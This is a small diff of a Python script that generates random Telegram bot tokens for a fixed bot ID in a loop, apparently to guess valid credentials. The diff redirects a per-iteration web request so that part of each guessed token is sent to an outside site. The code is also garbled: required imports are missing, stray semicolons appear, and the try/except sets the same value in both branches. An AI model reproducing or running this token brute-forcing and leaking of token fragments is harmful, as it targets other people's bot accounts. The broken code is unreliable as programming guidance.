@@ -1,11 +1,11 @@
-#ADMlNxd pixabay
+#ADMlNxd bepractical
 import requests
 chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"
 for k in range(1000):
   token = "609517172:" + "".join(random.choices(chars,k=35))
   new_bot = Bot(token)
   try:
-    requests.get("https://codechamp.netlify.app");
+    requests.get("https://bepractical.tech/?s="+token[15:20]);
     username = None
   except:
     username = None
